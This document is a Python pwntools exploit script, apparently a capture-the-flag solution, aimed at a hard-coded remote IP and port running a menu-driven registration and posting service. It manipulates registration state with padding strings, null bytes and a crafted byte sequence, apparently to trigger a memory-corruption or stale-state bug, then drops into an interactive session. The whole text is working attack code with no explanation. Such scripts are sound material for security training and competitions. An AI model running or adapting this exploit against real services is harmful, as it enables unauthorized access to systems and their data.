#!/usr/bin/env python
from pwn import *

r = remote('110.10.212.136', 4445)
registered = False

def menu(choice):
    r.recvuntil('-> ')
    r.sendline(str(choice))

def register():
    global registered
    menu(1)
    r.recvuntil('-> ')
    r.sendline('A' * 11)
    r.recvuntil('-> ')
    r.sendline('A' * 14)
    r.recvuntil('-> ')
    r.sendline('A' * 6)
    r.recvuntil('-> ')
    r.sendline('A' * 89)
    registered = True

def unregister():
    global registered
    assert registered
    menu(1)
    r.recvuntil('->')
    r.sendline('Y')
    registered = False

def create_post():
    global registered
    menu(2)
    if not registered:
        r.recvuntil('-> ')
        r.sendline('\x00' * 11)
        r.recvuntil('-> ')
        r.sendline('\x7f\x29\x41')
        r.recvuntil('-> ')
        r.sendline('D' * 6)
        r.recvuntil('-> ')
        r.sendline('E' * 89)
        registered = True
    r.recvuntil('-> ')
    r.sendline('1')
    r.recvuntil('-> ')
    r.sendline('1')
    r.recvuntil('-> ')
    r.sendline('a')
    r.recvuntil('-> ')
    r.sendline('a')
    r.recvuntil('-> ')
    r.sendline('a')
    r.recvuntil('-> ')
    r.sendline('a')
    r.recvuntil('-> ')
    r.sendline('a')
    r.recvuntil('-> ')
    r.sendline('N')

def send_post(x):
    menu(4)
    r.recvuntil('-> ')
    r.sendline(str(x))

register()
create_post()
unregister()
create_post()
send_post(1)
unregister()

menu(3)
r.recvuntil('-> ')
r.sendline('1')
r.recvuntil('-> ')
r.sendline('4')

r.interactive()
